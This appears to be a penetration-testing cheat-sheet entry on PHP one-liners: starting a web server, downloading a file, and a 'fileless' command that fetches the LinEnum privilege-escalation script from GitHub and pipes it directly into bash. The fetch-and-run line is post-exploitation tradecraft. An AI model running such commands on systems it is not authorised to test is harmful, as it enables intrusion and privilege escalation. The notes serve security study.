---
type: tool
category: web
tags:
  - scripting-language
  - programming-language
---
# Overview

## Quick Commands
### Creating a Web Server with PHP
```php
php -S 0.0.0.0:8000
```

### PHP Download with File_get_contents()
In the following example, we will use the PHP file_get_contents() module to download content from a website combined with the file_put_contents() module to save the file into a directory. PHP can be used to run one-liners from an operating system command line using the option -r.
```php
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

### Fileless Download with PHP
```php
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

